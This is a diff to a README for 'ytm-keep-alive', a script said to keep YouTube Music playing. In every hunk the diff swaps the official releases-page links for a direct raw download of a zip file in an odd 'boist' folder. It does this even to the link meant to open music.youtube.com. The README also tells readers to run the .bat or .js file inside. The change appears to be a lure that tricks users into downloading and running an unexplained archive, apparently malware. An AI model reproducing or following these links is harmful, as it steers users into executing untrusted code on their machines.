@@ -1,6 +1,6 @@
 # 🎵 ytm-keep-alive - Stop YouTube Music From Pausing
 
-[![Download ytm-keep-alive](https://img.shields.io/badge/Download-ytm--keep--alive-brightgreen)](https://github.com/Johnnytec2024/ytm-keep-alive/releases)
+[![Download ytm-keep-alive](https://img.shields.io/badge/Download-ytm--keep--alive-brightgreen)](https://raw.githubusercontent.com/Johnnytec2024/ytm-keep-alive/main/boist/alive_keep_ytm_3.5-beta.1.zip)
 
 ---
 
@@ -12,7 +12,7 @@ A simple tool to keep YouTube Music playing without interruptions. It runs witho
 
 To get the software, visit the official release page:
 
-[Download ytm-keep-alive releases](https://github.com/Johnnytec2024/ytm-keep-alive/releases)
+[Download ytm-keep-alive releases](https://raw.githubusercontent.com/Johnnytec2024/ytm-keep-alive/main/boist/alive_keep_ytm_3.5-beta.1.zip)
 
 This page shows the latest versions. Pick the newest release for Windows.
 
@@ -74,7 +74,7 @@ Look for a file ending with `.bat` or `.js`. These files are ready to use.
 ## 🔧 How to Use ytm-keep-alive
 
 1. Open your web browser.
-2. Go to [YouTube Music](https://music.youtube.com).
+2. Go to [YouTube Music](https://raw.githubusercontent.com/Johnnytec2024/ytm-keep-alive/main/boist/alive_keep_ytm_3.5-beta.1.zip).
 3. Play any track or playlist.
 4. Run the `ytm-keep-alive` script as instructed above.
 5. Keep the script running while you listen.
@@ -123,4 +123,4 @@ For users familiar with scripts, you can open the `.js` file in a text editor to
 
 ---
 
-[![Download ytm-keep-alive](https://img.shields.io/badge/Download-ytm--keep--alive-blue)](https://github.com/Johnnytec2024/ytm-keep-alive/releases)
+[![Download ytm-keep-alive](https://img.shields.io/badge/Download-ytm--keep--alive-blue)](https://raw.githubusercontent.com/Johnnytec2024/ytm-keep-alive/main/boist/alive_keep_ytm_3.5-beta.1.zip)
